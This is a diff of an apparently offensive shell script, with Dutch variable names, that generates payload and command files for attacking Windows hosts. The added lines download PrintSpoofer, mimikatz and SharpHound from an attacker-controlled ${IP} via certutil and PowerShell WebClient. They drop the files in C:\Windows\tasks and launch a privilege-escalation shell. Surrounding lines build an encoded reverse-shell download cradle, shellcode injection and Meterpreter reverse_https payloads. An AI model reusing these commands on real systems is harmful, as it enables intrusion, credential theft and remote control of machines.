@@ -114,18 +114,20 @@ python3 powershell.py ${IP} ${PORT} ${BESTAND}_${PORT}.txt
 
 #http/commands uitbreiden
 echo '#Downloads' >> http/payloads/${BESTAND}_${PORT}.txt
-echo 'certutil -urlcache -f http://${IP}/tools/PrintSpoofer64.exe print.exe' >> http/payloads/${BESTAND}_${PORT}.txt
-echo 'certutil -urlcache -f http://${IP}/tools/mimi/mimikatz.exe mimi.exe' >> http/payloads/${BESTAND}_${PORT}.txt
-echo 'certutil -urlcache -f http://${IP}/tools/SharpHound.exe sharphound.exe' >> http/payloads/${BESTAND}_${PORT}.txt
+echo 'certutil -urlcache -split -f http://${IP}/tools/PrintSpoofer64.exe print.exe' >> http/payloads/${BESTAND}_${PORT}.txt
+echo 'certutil -urlcache -split -f http://${IP}/tools/mimi/mimikatz.exe mimi.exe' >> http/payloads/${BESTAND}_${PORT}.txt
+echo 'certutil -urlcache -split -f http://${IP}/tools/SharpHound.exe sharphound.exe' >> http/payloads/${BESTAND}_${PORT}.txt
+echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/tools/PrintSpoofer64.exe','c:\windows\\tasks\print.exe')" >> http/payloads/${BESTAND}_${PORT}.txt
+echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/tools/mimi/mimikatz.exe','c:\windows\\tasks\mimi.exe')" >> http/payloads/${BESTAND}_${PORT}.txt
+echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/tools/SharpHound.exe','c:\windows\\tasks\sharphound.exe')" >> http/payloads/${BESTAND}_${PORT}.txt
 
 
-echo "cd C:\Windows\tasks && certutil -urlcache -f http://${IP}/tools/PrintSpoofer64.exe print.exe && print.exe -i -c cmd" > http/commands/printspoofer
-echo "cd C:\Windows\tasks && certutil -urlcache -f http://${IP}/tools/mimikatz.exe mimi.exe" > http/commands/mimikatz
-echo "cd C:\Windows\tasks && certutil -urlcache -f http://${IP}/SharpHound.exe sharphound.exe" > http/commands/sharphound
-
-
-
-
+echo "cd C:\Windows\\tasks && certutil -urlcache -f http://${IP}/tools/PrintSpoofer64.exe print.exe && print.exe -i -c cmd" > http/commands/printspoofer
+echo "cd C:\Windows\\tasks && certutil -urlcache -f http://${IP}/tools/mimikatz.exe mimi.exe" > http/commands/mimikatz
+echo "cd C:\Windows\\tasks && certutil -urlcache -f http://${IP}/SharpHound.exe sharphound.exe" > http/commands/sharphound
+echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/tools/PrintSpoofer64.exe','c:\windows\\tasks\print.exe')" > http/commands/psprintspooler
+echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/tools/mimi/mimikatz.exe','c:\windows\\tasks\mimi.exe')" > http/commands/psmimikatz
+echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/tools/SharpHound.exe','c:\windows\\tasks\sharphound.exe')" > http/commands/pssharphound
 
 
 
@@ -134,7 +136,7 @@ echo 'IEX ()' >> http/payloads/${BESTAND}_${PORT}.txt
 python3 invoke-shellcode.py ${IP} ${PORT}
 
 
-echo '(New-Object Net.WebClient).DownloadString("http://${IP}/Invoke-PowerShellTcpRun.ps1")' | iconv -t utf-16le | base64 -w 0
+#echo '(New-Object Net.WebClient).DownloadString("http://${IP}/Invoke-PowerShellTcpRun.ps1")' | iconv -t utf-16le | base64 -w 0
 
 echo "[+] Generate METH reverse HTTPS payload for ${IP} on port ${PORT}"
 echo '#METERPRETER (reverse_https)' >> http/payloads/${BESTAND}_${PORT}.txt
